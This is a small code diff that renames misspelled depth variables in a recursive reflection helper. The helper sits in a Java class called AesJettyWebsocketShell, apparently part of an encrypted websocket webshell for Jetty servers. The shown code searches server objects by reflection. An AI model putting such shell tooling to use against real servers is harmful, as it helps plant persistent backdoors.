@@ -88,10 +88,10 @@ public class AesJettyWebsocketShell extends Endpoint implements MessageHandler.W
         }
         return contexts.toArray();
     }
-    public static Object searchObject(String targetClassName, Object object, HashSet<Integer> blacklist,HashSet<String> blackType,int maxDetch,int currentDetch)throws Throwable {
-        currentDetch++;
+    public static Object searchObject(String targetClassName, Object object, HashSet<Integer> blacklist,HashSet<String> blackType,int maxDepth,int currentDepth)throws Throwable {
+        currentDepth++;
 
-        if (currentDetch >= maxDetch){
+        if (currentDepth >= maxDepth){
             return null;
         }
 
@@ -129,14 +129,14 @@ public class AesJettyWebsocketShell extends Endpoint implements MessageHandler.W
                                     if (!blackType.contains(fieldType.getComponentType().getName())){
                                         int arraySize = Array.getLength(fieldValue);
                                         for (int j = 0; j < arraySize; j++) {
-                                            ret = searchObject(targetClassName,Array.get(fieldValue,j),blacklist,blackType,maxDetch,currentDetch);
+                                            ret = searchObject(targetClassName,Array.get(fieldValue,j),blacklist,blackType,maxDepth,currentDepth);
                                             if (ret!= null){
                                                 break;
                                             }
                                         }
                                     }
                                 }else{
-                                    ret = searchObject(targetClassName,fieldValue,blacklist,blackType,maxDetch,currentDetch);
+                                    ret = searchObject(targetClassName,fieldValue,blacklist,blackType,maxDepth,currentDepth);
                                 }
                                 if (ret!= null){
                                     return ret;
